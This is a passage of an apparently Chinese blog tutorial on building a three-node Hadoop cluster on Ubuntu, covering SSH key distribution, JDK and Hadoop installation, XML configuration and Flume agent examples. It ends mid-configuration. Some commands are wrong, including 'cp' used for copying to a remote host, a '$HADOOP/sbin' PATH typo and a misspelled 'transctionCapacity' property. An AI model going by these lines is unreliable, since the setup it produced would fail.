AAAAB3NzaC1kc3MAAACBANwhno/+fLpWNOg1NOrBQ+qs7XWLZeu+Xxl/g5eJOD9+qaQKTWLOYfgyez38cpqjZ9r39tKRR5HQ7RVlM0tJicGgz+jCdtRoQKs6W5mc3SCmW+u+ILMxxTqdUHUKsNq4NauoVcSduq4ot8HKpi2GBGWE1MCNgCaSnH6TB8tvl49lAAAAFQCnfx5p+/KbSsrlSFo9BYuAhEuI7QAAAIA4lsxJjI3bn/FQsSjzcjIyRLiut432/i/QngE7Y9UwQGXKY9x8z7EksXDpdswo2M2cBSZsrelSnoiUYHjusSfMTptzdT8WUWCutCd7Kn1zU4fPJCM4gTNuECjHaWU/t7BVJXHGkB6eWErcHxnm6iILVLCFf9wm8oPMjRJmLLQGhQAAAIEAkA+YrcoTQfuZbS8ACHN3zkvg1/gAmx26owiZsMrSaV1rbrJ6WgWCX+Ux9CHIkKK4MZrJrXVQpoal5/PEPw0OCZepCHOGVLNcrhyhKNov1EzSC664Mb0l+9bHh+zXjv/X0yrMB1bY16eNMBCnx0YsJ5vuXZtZRg9ms6dEh5eA/LY= root@slave2</span><br></pre></td></tr></table></figure><p>4.分发给另外两台子节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/.ssh<span class="comment"># scp ./authorized.keys root@slave1:/root/.ssh/</span></span><br><span class="line">root@master:~/.ssh<span class="comment"># scp ./authorized.keys root@slave2:/root/.ssh/</span></span><br></pre></td></tr></table></figure><p>5.测试免密登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh master</span><br><span class="line">ssh slave1</span><br><span class="line">ssh slave2</span><br></pre></td></tr></table></figure><h3 id="四-安装jdk"><a href="#四-安装jdk" class="headerlink" title="四.安装jdk"></a>四.安装jdk</h3><p>1.解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/jdk/jdk1.8.0_11<span class="comment"># tar -zxvf jdk-8u11-linux-x64.tar.gz</span></span><br></pre></td></tr></table></figure><p>2.分发给其余子节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /root/software/jdk/jdk1.8.0_11/ root@slave1:/root/software/jdk/</span><br><span class="line"><span class="built_in">cp</span> -r /root/software/jdk/jdk1.8.0_11/ root@slave2:/root/software/jdk/</span><br></pre></td></tr></table></figure><p>3.配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/jdk/jdk1.8.0_11<span class="comment"># gedit /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>配置如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#JAVA_HOME</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/root/software/jdk/jdk1.8.0_11</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>分发给其他节点,也可以直接配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/jdk/jdk1.8.0_11<span class="comment"># scp -r /root/.bashrc root@slave1:/root/</span></span><br><span class="line">root@master:~/software/jdk/jdk1.8.0_11<span class="comment"># scp -r /root/.bashrc root@slave2:/root/</span></span><br></pre></td></tr></table></figure><p>4.刷新环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/jdk/jdk1.8.0_11<span class="comment"># source /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>5.测试<br>如下回显则表示成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/jdk/jdk1.8.0_11<span class="comment"># java -version</span></span><br><span class="line">java version <span class="string">&quot;1.8.0_11&quot;</span></span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_11-b12)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.11-b03, mixed mode)</span><br></pre></td></tr></table></figure><h3 id="五-安装hadoop"><a href="#五-安装hadoop" class="headerlink" title="五.安装hadoop"></a>五.安装hadoop</h3><p>1.解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop<span class="comment"># tar -zxvf hadoop-2.7.3.tar.gz</span></span><br></pre></td></tr></table></figure><p>2.配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop<span class="comment"># gedit /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>配置如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#HADOOP_HOME</span></span><br><span class="line"><span class="built_in">export</span> HADOOP_HOME=/root/software/hadoop/hadoop-2.7.3</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$HADOOP_HOME</span>/bin:<span class="variable">$HADOOP</span>/sbin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>分发给子节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop<span class="comment"># scp -r /root/.bashrc root@slave1:/root/</span></span><br><span class="line">root@master:~/software/hadoop<span class="comment"># scp -r /root/.bashrc root@slave2:/root/</span></span><br></pre></td></tr></table></figure><p>刷新环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop<span class="comment"># source /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>3.创建hadoopdata目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3<span class="comment"># mkdir hadoopdata</span></span><br></pre></td></tr></table></figure><p>4.配置hadoop-env.sh文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># cd etc/hadoop/</span></span><br><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit hadoop-env.sh </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">找到</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span></span><br><span class="line">修改为</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/root/software/jdk/jdk1.8.0_11</span><br></pre></td></tr></table></figure><p>5.配置yarn-env.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit yarn-env.sh </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">找到</span><br><span class="line"><span class="comment">#export JAVA_HOME=/home/y/libexec/jdk1.6.0/</span></span><br><span class="line">修改为</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/root/software/jdk/jdk1.8.0_11</span><br></pre></td></tr></table></figure><p>6.配置核心组件core-site.xml </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit core-site.xml </span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://master:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/root/software/hadoop/hadoop-2.7.3/hadoopdata<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>7.配置配置文件系统hdfs-site.xml</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit hdfs-site.xml </span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.rpc-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>master:50071<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>8.配置文件系统yarn-site.xm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit yarn-site.xml</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>master:18040<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span>                <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>master:18030<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.resource-tracker.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>master:18025<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span>                <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.admin.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>master:18141<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span>                <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.webapp.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>master:18088<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>9.配置计算框架mapred-site.xml</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># cp mapred-site.xml.template mapred-site.xml</span></span><br><span class="line"></span><br><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit mapred-site.xml</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>10.配置slaves文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># gedit slaves </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">master</span><br><span class="line">slave1</span><br><span class="line">slave2</span><br></pre></td></tr></table></figure><p>11.分发给子节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># scp -r /root/software/hadoop/hadoop-2.7.3/ root@slave2:/root/software/hadoop/</span></span><br></pre></td></tr></table></figure><p>12.格式化namanode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop<span class="comment"># hdfs namenode -format</span></span><br></pre></td></tr></table></figure><p>13.启动hadoop</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进入sbin目录下执行</span><br><span class="line"></span><br><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/sbin<span class="comment"># ./start-all.sh </span></span><br><span class="line"></span><br><span class="line">执行命令后，提示出入<span class="built_in">yes</span>/no时，输入<span class="built_in">yes</span>。</span><br></pre></td></tr></table></figure><p>14.测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/sbin<span class="comment"># jps</span></span><br></pre></td></tr></table></figure><p>有以下进程表示搭建成功!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hadoop/hadoop-2.7.3/sbin<span class="comment"># jps</span></span><br><span class="line">4848 SecondaryNameNode</span><br><span class="line">4999 ResourceManager</span><br><span class="line">4489 NameNode</span><br><span class="line">4650 DataNode</span><br><span class="line">5423 Jps</span><br><span class="line">5135 NodeManager</span><br></pre></td></tr></table></figure><p>15.web端查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Master上启动Firefox浏览器，在浏览器地址栏中输入输入http://master:50070/,有如下回显表示成功</span><br></pre></td></tr></table></figure><p><img src="/2022/03/01/ubuntu%E4%B8%8Bhadoop%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/QQ20220301-220428.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Master上启动Firefox浏览器，在浏览器地址栏中输入输入http://master:18088/，检查 Yarn是否正常，页面如下图所示。</span><br></pre></td></tr></table></figure><p><img src="/2022/03/01/ubuntu%E4%B8%8Bhadoop%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/QQ20220301-220440.png" alt="2"></p><h3 id="六-flume安装与配置"><a href="#六-flume安装与配置" class="headerlink" title="六.flume安装与配置"></a>六.flume安装与配置</h3><p>1.解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf apache-flume-1.7.0-bin.tar.gz </span><br></pre></td></tr></table></figure><p>2.配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#FLUME_HOME</span></span><br><span class="line"><span class="built_in">export</span> FLUME_HOME=/root/software/flume-1.7.0</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$FLUME_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>3.复制配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> flume-env.sh.template flume-env.sh</span><br></pre></td></tr></table></figure><p>修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># export JAVA_HOME=/usr/lib/jvm/java-6-sun</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/root/software/jdk1.8.0_11</span><br></pre></td></tr></table></figure><p>4.配置配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>: 数据的入口,规定了数据收集的入口规范</span><br><span class="line">channel: 管道,存储数据用的</span><br><span class="line">skin: 数据的出口,规定了数据收集的出口规范</span><br><span class="line">agent: 一个任务,包含了<span class="built_in">source</span>,channel,skin</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> flume-conf.properties.template flume-conf.properties</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a1.sources.r1.type = netcat</span><br><span class="line">a1.sources.r1.bind = localhost</span><br><span class="line">a1.sources.r1.port = 44444</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a1.sinks.k1.type = logger</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><p>5.启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flume-ng agent --conf conf --conf-file conf/flume-conf.properties --name a1 -Dflume.root.logger=INFO,console</span><br></pre></td></tr></table></figure><p>6.nc测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc localhost 44444</span><br></pre></td></tr></table></figure><p>7.案例一<br>监听文件内容变动，将新增加的内容输出到控制台。<br>新建配置文件 exec-memory-logger.properties,其内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定agent的sources,sinks,channels</span></span><br><span class="line">a1.sources = s1  </span><br><span class="line">a1.sinks = k1  </span><br><span class="line">a1.channels = c1  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#配置sources属性</span></span><br><span class="line">a1.sources.s1.type = <span class="built_in">exec</span></span><br><span class="line">a1.sources.s1.command = <span class="built_in">tail</span> -F /tmp/log.txt</span><br><span class="line">a1.sources.s1.bash = /bin/bash -c</span><br><span class="line"></span><br><span class="line"><span class="comment">#将sources与channels进行绑定</span></span><br><span class="line">a1.sources.s1.channels = c1</span><br><span class="line">   </span><br><span class="line"><span class="comment">#配置sink </span></span><br><span class="line">a1.sinks.k1.type = logger</span><br><span class="line"></span><br><span class="line"><span class="comment">#将sinks与channels进行绑定  </span></span><br><span class="line">a1.sinks.k1.channel = c1  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#配置channel类型</span></span><br><span class="line">a1.channels.c1.type = memory</span><br></pre></td></tr></table></figure><p>8.案例二<br>监听指定端口,将这个向这个端口写入的数据输出到控制台</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a1.sources.r1.type = netcat</span><br><span class="line">a1.sources.r1.bind = 192.168.32.130</span><br><span class="line">a1.sources.r1.port = 44444</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a1.sinks.k1.type = logger</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transctionCapacity = 100</span><br><span class="line"></span><br><span class="line"><span class="comment">#Bind the source and sink to the channel</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><p>9.案例三<br>监听指定目录，将目录下新增加的文件存储到 HDFS。<br>新建配置文件spooling-memory-hdfs.properties</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定agent的sources,sinks,channels</span></span><br><span class="line">a1.sources = s1  </span><br><span class="line">a1.sinks = k1  </span><br><span class="line">a1.channels = c1  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#配置sources属性</span></span><br><span class="line">a1.sources.s1.type =spooldir  </span><br><span class="line">a1.sources.s1.spoolDir =/tmp/logs</span><br><span class="line">a1.sources.s1.basenameHeader = <span class="literal">true</span></span><br><span class="line">a1.sources.s1.basenameHeaderKey = fileName </span><br><span class="line"><span class="comment">#将sources与channels进行绑定  </span></span><br><span class="line">a1.sources.s1.channels =c1 </span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"><span class="comment">#配置sink </span></span><br><span class="line">a1.sinks.k1.type = hdfs</span><br><span class="line">a1.sinks.k1.hdfs.path = /flume/events/%y-%m-%d/%H/</span><br><span class="line">a1.sinks.k1.hdfs.filePrefix = %&#123;fileName&#125;</span><br><span class="line"><span class="comment">#生成的文件类型，默认是Sequencefile，可用DataStream，则为普通文本</span></span><br><span class="line">a1.sinks.k1.hdfs.fileType = DataStream  </span><br><span class="line">a1.sinks.k1.hdfs.useLocalTimeStamp = <span class="literal">true</span></span><br><span class="line"><span class="comment">#将sinks与channels进行绑定  </span></span><br><span class="line">a1.sinks.k1.channel = c1</span><br><span class="line">   </span><br><span class="line"><span class="comment">#配置channel类型</span></span><br><span class="line">a1.channels.c1.type = 